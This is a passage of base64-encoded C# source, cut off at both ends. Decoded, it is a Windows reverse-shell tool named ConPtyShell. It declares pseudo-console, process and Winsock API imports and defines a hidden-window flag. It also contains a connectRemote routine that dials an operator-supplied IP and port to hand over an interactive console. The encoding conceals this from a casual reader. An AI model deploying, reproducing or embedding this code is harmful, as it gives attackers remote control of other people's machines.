dWVyeUluZm9ybWF0aW9uUHJvY2VzcyhoYW5kbGUsIDAsIHJlZiBwYmksIE1hcnNoYWwuU2l6ZU9mKHBiaSksIG91dCByZXR1cm5MZW5ndGgpOwogICAgICAgIGlmIChzdGF0dXMgIT0gMCkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKHN0YXR1cy5Ub1N0cmluZygpKTsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHJldHVybiBQcm9jZXNzLkdldFByb2Nlc3NCeUlkKHBiaS5Jbmhlcml0ZWRGcm9tVW5pcXVlUHJvY2Vzc0lkLlRvSW50MzIoKSk7CiAgICAgICAgfQogICAgICAgIGNhdGNoIChBcmd1bWVudEV4Y2VwdGlvbikKICAgICAgICB7CiAgICAgICAgICAgIC8vIG5vdCBmb3VuZAogICAgICAgICAgICByZXR1cm4gbnVsbDsKICAgICAgICB9CiAgICB9Cn0KCnB1YmxpYyBzdGF0aWMgY2xhc3MgQ29uUHR5U2hlbGwKewogICAgcHJpdmF0ZSBjb25zdCBzdHJpbmcgZXJyb3JTdHJpbmcgPSAie3t7Q29uUHR5U2hlbGxFeGNlcHRpb259fX1cclxuIjsKICAgIHByaXZhdGUgY29uc3QgdWludCBFTkFCTEVfVklSVFVBTF9URVJNSU5BTF9QUk9DRVNTSU5HID0gMHgwMDA0OwogICAgcHJpdmF0ZSBjb25zdCB1aW50IERJU0FCTEVfTkVXTElORV9BVVRPX1JFVFVSTiA9IDB4MDAwODsKICAgIHByaXZhdGUgY29uc3QgdWludCBQUk9DX1RIUkVBRF9BVFRSSUJVVEVfUFNFVURPQ09OU09MRSA9IDB4MDAwMjAwMTY7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRVhURU5ERURfU1RBUlRVUElORk9fUFJFU0VOVCA9IDB4MDAwODAwMDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVEFSVEZfVVNFU1RESEFORExFUyA9IDB4MDAwMDAxMDA7CiAgICBwcml2YXRlIGNvbnN0IGludCBCVUZGRVJfU0laRV9QSVBFID0gMTA0ODU3NjsKICAgIHByaXZhdGUgY29uc3QgaW50IFdTQV9GTEFHX09WRVJMQVBQRUQgPSAweDE7CiAgICBwcml2YXRlIGNvbnN0IFVJbnQzMiBJTkZJTklURSA9IDB4RkZGRkZGRkY7CiAgICBwcml2YXRlIGNvbnN0IGludCBTV19ISURFID0gMDsKICAgIHByaXZhdGUgY29uc3QgdWludCBHRU5FUklDX1JFQUQgPSAweDgwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEdFTkVSSUNfV1JJVEUgPSAweDQwMDAwMDAwOwogICAgcHJpdmF0ZSBjb25zdCB1aW50IEZJTEVfU0hBUkVfUkVBRCA9IDB4MDAwMDAwMDE7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRklMRV9TSEFSRV9XUklURSA9IDB4MDAwMDAwMDI7CiAgICBwcml2YXRlIGNvbnN0IHVpbnQgRklMRV9BVFRSSUJVVEVfTk9STUFMID0gMHg4MDsKICAgIHByaXZhdGUgY29uc3QgdWludCBPUEVOX0VYSVNUSU5HID0gMzsKICAgIHByaXZhdGUgY29uc3QgaW50IFNURF9JTlBVVF9IQU5ETEUgPSAtMTA7CiAgICBwcml2YXRlIGNvbnN0IGludCBTVERfT1VUUFVUX0hBTkRMRSA9IC0xMTsKICAgIHByaXZhdGUgY29uc3QgaW50IFNURF9FUlJPUl9IQU5ETEUgPSAtMTI7CiAgICBwcml2YXRlIGNvbnN0IGludCBXU0FFV09VTERCTE9DSyA9IDEwMDM1OwogICAgcHJpdmF0ZSBjb25zdCBpbnQgRkRfUkVBRCA9ICgxIDw8IDApOwoKCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCwgQ2hhclNldCA9IENoYXJTZXQuVW5pY29kZSldCiAgICBwcml2YXRlIHN0cnVjdCBTVEFSVFVQSU5GT0VYCiAgICB7CiAgICAgICAgcHVibGljIFNUQVJUVVBJTkZPIFN0YXJ0dXBJbmZvOwogICAgICAgIHB1YmxpYyBJbnRQdHIgbHBBdHRyaWJ1dGVMaXN0OwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsLCBDaGFyU2V0ID0gQ2hhclNldC5Vbmljb2RlKV0KICAgIHByaXZhdGUgc3RydWN0IFNUQVJUVVBJTkZPCiAgICB7CiAgICAgICAgcHVibGljIEludDMyIGNiOwogICAgICAgIHB1YmxpYyBzdHJpbmcgbHBSZXNlcnZlZDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwRGVza3RvcDsKICAgICAgICBwdWJsaWMgc3RyaW5nIGxwVGl0bGU7CiAgICAgICAgcHVibGljIEludDMyIGR3WDsKICAgICAgICBwdWJsaWMgSW50MzIgZHdZOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lTaXplOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1hDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd1lDb3VudENoYXJzOwogICAgICAgIHB1YmxpYyBJbnQzMiBkd0ZpbGxBdHRyaWJ1dGU7CiAgICAgICAgcHVibGljIEludDMyIGR3RmxhZ3M7CiAgICAgICAgcHVibGljIEludDE2IHdTaG93V2luZG93OwogICAgICAgIHB1YmxpYyBJbnQxNiBjYlJlc2VydmVkMjsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwUmVzZXJ2ZWQyOwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZElucHV0OwogICAgICAgIHB1YmxpYyBJbnRQdHIgaFN0ZE91dHB1dDsKICAgICAgICBwdWJsaWMgSW50UHRyIGhTdGRFcnJvcjsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBQUk9DRVNTX0lORk9STUFUSU9OCiAgICB7CiAgICAgICAgcHVibGljIEludFB0ciBoUHJvY2VzczsKICAgICAgICBwdWJsaWMgSW50UHRyIGhUaHJlYWQ7CiAgICAgICAgcHVibGljIGludCBkd1Byb2Nlc3NJZDsKICAgICAgICBwdWJsaWMgaW50IGR3VGhyZWFkSWQ7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgU0VDVVJJVFlfQVRUUklCVVRFUwogICAgewogICAgICAgIHB1YmxpYyBpbnQgbkxlbmd0aDsKICAgICAgICBwdWJsaWMgSW50UHRyIGxwU2VjdXJpdHlEZXNjcmlwdG9yOwogICAgICAgIHB1YmxpYyBpbnQgYkluaGVyaXRIYW5kbGU7CiAgICB9CgogICAgW1N0cnVjdExheW91dChMYXlvdXRLaW5kLlNlcXVlbnRpYWwpXQogICAgcHJpdmF0ZSBzdHJ1Y3QgQ09PUkQKICAgIHsKICAgICAgICBwdWJsaWMgc2hvcnQgWDsKICAgICAgICBwdWJsaWMgc2hvcnQgWTsKICAgIH0KCiAgICBbU3RydWN0TGF5b3V0KExheW91dEtpbmQuU2VxdWVudGlhbCldCiAgICBwcml2YXRlIHN0cnVjdCBXU0FEYXRhCiAgICB7CiAgICAgICAgcHVibGljIHNob3J0IHdWZXJzaW9uOwogICAgICAgIHB1YmxpYyBzaG9ydCB3SGlnaFZlcnNpb247CiAgICAgICAgcHVibGljIHNob3J0IGlNYXhTb2NrZXRzOwogICAgICAgIHB1YmxpYyBzaG9ydCBpTWF4VWRwRGc7CiAgICAgICAgcHVibGljIEludFB0ciBscFZlbmRvckluZm87CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0ID0gMjU3KV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6RGVzY3JpcHRpb247CiAgICAgICAgW01hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJ5VmFsVFN0ciwgU2l6ZUNvbnN0ID0gMTI5KV0KICAgICAgICBwdWJsaWMgc3RyaW5nIHN6U3lzdGVtU3RhdHVzOwogICAgfQoKICAgIFtTdHJ1Y3RMYXlvdXQoTGF5b3V0S2luZC5TZXF1ZW50aWFsKV0KICAgIHByaXZhdGUgc3RydWN0IFNPQ0tBRERSX0lOCiAgICB7CiAgICAgICAgcHVibGljIHNob3J0IHNpbl9mYW1pbHk7CiAgICAgICAgcHVibGljIHNob3J0IHNpbl9wb3J0OwogICAgICAgIHB1YmxpYyB1aW50IHNpbl9hZGRyOwogICAgICAgIHB1YmxpYyBsb25nIHNpbl96ZXJvOwogICAgfQoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBJbml0aWFsaXplUHJvY1RocmVhZEF0dHJpYnV0ZUxpc3QoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgaW50IGR3QXR0cmlidXRlQ291bnQsIGludCBkd0ZsYWdzLCByZWYgSW50UHRyIGxwU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFVwZGF0ZVByb2NUaHJlYWRBdHRyaWJ1dGUoSW50UHRyIGxwQXR0cmlidXRlTGlzdCwgdWludCBkd0ZsYWdzLCBJbnRQdHIgYXR0cmlidXRlLCBJbnRQdHIgbHBWYWx1ZSwgSW50UHRyIGNiU2l6ZSwgSW50UHRyIGxwUHJldmlvdXNWYWx1ZSwgSW50UHRyIGxwUmV0dXJuU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgRW50cnlQb2ludCA9ICJDcmVhdGVQcm9jZXNzIildCiAgICBbcmV0dXJuOiBNYXJzaGFsQXMoVW5tYW5hZ2VkVHlwZS5Cb29sKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIENyZWF0ZVByb2Nlc3NFeChzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFByb2Nlc3NBdHRyaWJ1dGVzLCByZWYgU0VDVVJJVFlfQVRUUklCVVRFUyBscFRocmVhZEF0dHJpYnV0ZXMsIGJvb2wgYkluaGVyaXRIYW5kbGVzLCB1aW50IGR3Q3JlYXRpb25GbGFncywgSW50UHRyIGxwRW52aXJvbm1lbnQsIHN0cmluZyBscEN1cnJlbnREaXJlY3RvcnksIFtJbl0gcmVmIFNUQVJUVVBJTkZPRVggbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIEVudHJ5UG9pbnQgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQ3JlYXRlUHJvY2VzcyhzdHJpbmcgbHBBcHBsaWNhdGlvbk5hbWUsIHN0cmluZyBscENvbW1hbmRMaW5lLCBJbnRQdHIgbHBQcm9jZXNzQXR0cmlidXRlcywgSW50UHRyIGxwVGhyZWFkQXR0cmlidXRlcywgYm9vbCBiSW5oZXJpdEhhbmRsZXMsIHVpbnQgZHdDcmVhdGlvbkZsYWdzLCBJbnRQdHIgbHBFbnZpcm9ubWVudCwgc3RyaW5nIGxwQ3VycmVudERpcmVjdG9yeSwgW0luXSByZWYgU1RBUlRVUElORk8gbHBTdGFydHVwSW5mbywgb3V0IFBST0NFU1NfSU5GT1JNQVRJT04gbHBQcm9jZXNzSW5mb3JtYXRpb24pOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgW3JldHVybjogTWFyc2hhbEFzKFVubWFuYWdlZFR5cGUuQm9vbCldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBUZXJtaW5hdGVQcm9jZXNzKEludFB0ciBoUHJvY2VzcywgdWludCB1RXhpdENvZGUpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIFVJbnQzMiBXYWl0Rm9yU2luZ2xlT2JqZWN0KEludFB0ciBoSGFuZGxlLCBVSW50MzIgZHdNaWxsaXNlY29uZHMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgU2V0U3RkSGFuZGxlKGludCBuU3RkSGFuZGxlLCBJbnRQdHIgaEhhbmRsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldFN0ZEhhbmRsZShpbnQgblN0ZEhhbmRsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDbG9zZUhhbmRsZShJbnRQdHIgaE9iamVjdCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBDcmVhdGVQaXBlKG91dCBJbnRQdHIgaFJlYWRQaXBlLCBvdXQgSW50UHRyIGhXcml0ZVBpcGUsIHJlZiBTRUNVUklUWV9BVFRSSUJVVEVTIGxwUGlwZUF0dHJpYnV0ZXMsIGludCBuU2l6ZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgQ2FsbGluZ0NvbnZlbnRpb24gPSBDYWxsaW5nQ29udmVudGlvbi5TdGRDYWxsLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgQ3JlYXRlRmlsZShzdHJpbmcgbHBGaWxlTmFtZSwgdWludCBkd0Rlc2lyZWRBY2Nlc3MsIHVpbnQgZHdTaGFyZU1vZGUsIEludFB0ciBTZWN1cml0eUF0dHJpYnV0ZXMsIHVpbnQgZHdDcmVhdGlvbkRpc3Bvc2l0aW9uLCB1aW50IGR3RmxhZ3NBbmRBdHRyaWJ1dGVzLCBJbnRQdHIgaFRlbXBsYXRlRmlsZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBSZWFkRmlsZShJbnRQdHIgaEZpbGUsIFtPdXRdIGJ5dGVbXSBscEJ1ZmZlciwgdWludCBuTnVtYmVyT2ZCeXRlc1RvUmVhZCwgb3V0IHVpbnQgbHBOdW1iZXJPZkJ5dGVzUmVhZCwgSW50UHRyIGxwT3ZlcmxhcHBlZCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBXcml0ZUZpbGUoSW50UHRyIGhGaWxlLCBieXRlW10gbHBCdWZmZXIsIHVpbnQgbk51bWJlck9mQnl0ZXNUb1dyaXRlLCBvdXQgdWludCBscE51bWJlck9mQnl0ZXNXcml0dGVuLCBJbnRQdHIgbHBPdmVybGFwcGVkKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgQ3JlYXRlUHNldWRvQ29uc29sZShDT09SRCBzaXplLCBJbnRQdHIgaElucHV0LCBJbnRQdHIgaE91dHB1dCwgdWludCBkd0ZsYWdzLCBvdXQgSW50UHRyIHBoUEMpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBDbG9zZVBzZXVkb0NvbnNvbGUoSW50UHRyIGhQQyk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBTZXRDb25zb2xlTW9kZShJbnRQdHIgaENvbnNvbGVIYW5kbGUsIHVpbnQgbW9kZSk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBHZXRDb25zb2xlTW9kZShJbnRQdHIgaGFuZGxlLCBvdXQgdWludCBtb2RlKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMi5kbGwiKV0KICAgIFtyZXR1cm46IE1hcnNoYWxBcyhVbm1hbmFnZWRUeXBlLkJvb2wpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgQWxsb2NDb25zb2xlKCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSwgRXhhY3RTcGVsbGluZyA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgRnJlZUNvbnNvbGUoKTsKCiAgICBbRGxsSW1wb3J0KCJ1c2VyMzIuZGxsIildCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOwoKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRDb25zb2xlV2luZG93KCk7CgogICAgW0RsbEltcG9ydCgia2VybmVsMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIEdldE1vZHVsZUhhbmRsZShzdHJpbmcgbHBNb2R1bGVOYW1lKTsKCiAgICBbRGxsSW1wb3J0KCJrZXJuZWwzMiIsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2ksIEV4YWN0U3BlbGxpbmcgPSB0cnVlLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0UHJvY0FkZHJlc3MoSW50UHRyIGhNb2R1bGUsIHN0cmluZyBwcm9jTmFtZSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkFuc2ksIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIEludFB0ciBXU0FTb2NrZXQoW0luXSBBZGRyZXNzRmFtaWx5IGFkZHJlc3NGYW1pbHksIFtJbl0gU29ja2V0VHlwZSBzb2NrZXRUeXBlLCBbSW5dIFByb3RvY29sVHlwZSBwcm90b2NvbFR5cGUsIFtJbl0gSW50UHRyIHByb3RvY29sSW5mbywgW0luXSB1aW50IGdyb3VwLCBbSW5dIGludCBmbGFncyk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBjb25uZWN0KEludFB0ciBzLCByZWYgU09DS0FERFJfSU4gYWRkciwgaW50IGFkZHJzaXplKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gdXNob3J0IGh0b25zKHVzaG9ydCBob3N0c2hvcnQpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BbnNpLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IGluZXRfYWRkcihzdHJpbmcgY3ApOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBJbnQzMiBXU0FHZXRMYXN0RXJyb3IoKTsKCiAgICBbRGxsSW1wb3J0KCJ3czJfMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50MzIgV1NBU3RhcnR1cChJbnQxNiB3VmVyc2lvblJlcXVlc3RlZCwgb3V0IFdTQURhdGEgd3NhRGF0YSk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LlVuaWNvZGUsIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBjbG9zZXNvY2tldChJbnRQdHIgcyk7CgogICAgW0RsbEltcG9ydCgid3MyXzMyLmRsbCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCByZWN2KEludFB0ciBTb2NrZXQsIGJ5dGVbXSBidWYsIGludCBsZW4sIHVpbnQgZmxhZ3MpOwoKICAgIFtEbGxJbXBvcnQoIndzMl8zMi5kbGwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBpbnQgc2VuZChJbnRQdHIgU29ja2V0LCBieXRlW10gYnVmLCBpbnQgbGVuLCB1aW50IGZsYWdzKTsKCiAgICBbRGxsSW1wb3J0KCJXUzJfMzIuRExMIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gSW50UHRyIFdTQUNyZWF0ZUV2ZW50KCk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGludCBXU0FFdmVudFNlbGVjdChJbnRQdHIgcywgSW50UHRyIGhFdmVudE9iamVjdCwgaW50IGxOZXR3b3JrRXZlbnRzKTsKCiAgICBbRGxsSW1wb3J0KCJXUzJfMzIuRExMIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0bywgU2V0TGFzdEVycm9yID0gdHJ1ZSldCiAgICBwcml2YXRlIHN0YXRpYyBleHRlcm4gaW50IFdTQVdhaXRGb3JNdWx0aXBsZUV2ZW50cyhpbnQgY0V2ZW50cywgSW50UHRyW10gbHBoRXZlbnRzLCBib29sIGZXYWl0QWxsLCBpbnQgZHdUaW1lb3V0LCBib29sIGZBbGVydGFibGUpOwoKICAgIFtEbGxJbXBvcnQoIldTMl8zMi5ETEwiLCBDaGFyU2V0ID0gQ2hhclNldC5BdXRvLCBTZXRMYXN0RXJyb3IgPSB0cnVlKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiBib29sIFdTQVJlc2V0RXZlbnQoSW50UHRyIGhFdmVudCk7CgogICAgW0RsbEltcG9ydCgiV1MyXzMyLkRMTCIsIENoYXJTZXQgPSBDaGFyU2V0LkF1dG8sIFNldExhc3RFcnJvciA9IHRydWUpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIGJvb2wgV1NBQ2xvc2VFdmVudChJbnRQdHIgaEV2ZW50KTsKCiAgICBbRGxsSW1wb3J0KCJudGRsbC5kbGwiKV0KICAgIHByaXZhdGUgc3RhdGljIGV4dGVybiB1aW50IE50U3VzcGVuZFByb2Nlc3MoSW50UHRyIHByb2Nlc3NIYW5kbGUpOwoKICAgIFtEbGxJbXBvcnQoIm50ZGxsLmRsbCIpXQogICAgcHJpdmF0ZSBzdGF0aWMgZXh0ZXJuIHVpbnQgTnRSZXN1bWVQcm9jZXNzKEludFB0ciBwcm9jZXNzSGFuZGxlKTsKCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIEluaXRXU0FUaHJlYWQoKQogICAgewogICAgICAgIFdTQURhdGEgZGF0YTsKICAgICAgICBpZiAoV1NBU3RhcnR1cCgyIDw8IDggfCAyLCBvdXQgZGF0YSkgIT0gMCkKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKFN0cmluZy5Gb3JtYXQoIldTQVN0YXJ0dXAgZmFpbGVkIHdpdGggZXJyb3IgY29kZTogezB9IiwgV1NBR2V0TGFzdEVycm9yKCkpKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyBJbnRQdHIgY29ubmVjdFJlbW90ZShzdHJpbmcgcmVtb3RlSXAsIGludCByZW1vdGVQb3J0KQogICAgewogICAgICAgIGludCBwb3J0ID0gMDsKICAgICAgICBpbnQgZXJyb3IgPSAwOwogICAgICAgIHN0cmluZyBob3N0ID0gcmVtb3RlSXA7CgogICAgICAgIHRyeQogICAgICAgIHsKICAgICAgICAgICAgcG9ydCA9IENvbnZlcnQuVG9JbnQzMihyZW1vdGVQb3J0KTsKICAgICAgICB9CiAgICAgICAgY2F0Y2gKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiU3BlY2lmaWVkIHBvcnQgaXMgaW52YWxpZDogIiArIHJlbW90ZVBvcnQuVG9TdHJpbmcoKSk7CiAgICAgICAgfQoKICAgICAgICBJbnRQdHIgc29ja2V0ID0gSW50UHRyLlplcm87CiAgICAgICAgc29ja2V0ID0gV1NBU29ja2V0KEFkZHJlc3NGYW1pbHkuSW50ZXJOZXR3b3JrLCBTb2NrZXRUeXBlLlN0cmVhbSwgUHJvdG9jb2xUeXBlLklQLCBJbnRQdHIuWmVybywgMCwgV1NBX0ZMQUdfT1ZFUkxBUFBFRCk7CiAgICAgICAgU09DS0FERFJfSU4gc29ja2luZm8gPSBuZXcgU09DS0FERFJfSU4oKTsKICAgICAgICBzb2NraW5mby5zaW5fZmFtaWx5ID0gKHNob3J0KTI7CiAgICAgICAgc29ja2luZm8uc2luX2FkZHIgPSBpbmV0X2FkZHIoaG9zdCk7CiAgICAgICAgc29ja2luZm8uc2luX3BvcnQgPSAoc2hvcnQpaHRvbnMoKHVzaG9ydClwb3J0KTsKCiAgICAgICAgaWYgKGNvbm5lY3Qoc29ja2V0LCByZWYgc29ja2luZm8sIE1hcnNoYWwuU2l6ZU9mKHNvY2tpbmZvKSkgIT0gMCkKICAgICAgICB7CiAgICAgICAgICAgIGVycm9yID0gV1NBR2V0TGFzdEVycm9yKCk7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbihTdHJpbmcuRm9ybWF0KCJXU0FDb25uZWN0IGZhaWxlZCB3aXRoIGVycm9yIGNvZGU6IHswfSIsIGVycm9yKSk7CiAgICAgICAgfQoKICAgICAgICByZXR1cm4gc29ja2V0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIHZvaWQgVHJ5UGFyc2VSb3dzQ29sc0Zyb21Tb2NrZXQoSW50UHRyIHNoZWxsU29ja2V0LCByZWYgdWludCByb3dzLCByZWYgdWludCBjb2xzKQogICAgewogICAgICAgIFRocmVhZC5TbGVlcCg1MDApOy8vbGl0dGxlIHR3ZWFrIGZvciBzbG93ZXIgY29ubmVjdGlvbnMKICAgICAgICBieXRlW10gcmVjZWl2ZWQgPSBuZXcgYnl0ZVsxMDBdOwogICAgICAgIGludCByb3dzVGVtcCwgY29sc1RlbXA7CiAgICAgICAgaW50IGJ5dGVzUmVjZWl2ZWQgPSByZWN2KHNoZWxsU29ja2V0LCByZWNlaXZlZCwgMTAwLCAwKTsKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIHN0cmluZyBzaXplUmVjZWl2ZWQgPSBFbmNvZGluZy5BU0NJSS5HZXRTdHJpbmcocmVjZWl2ZWQsIDAsIGJ5dGVzUm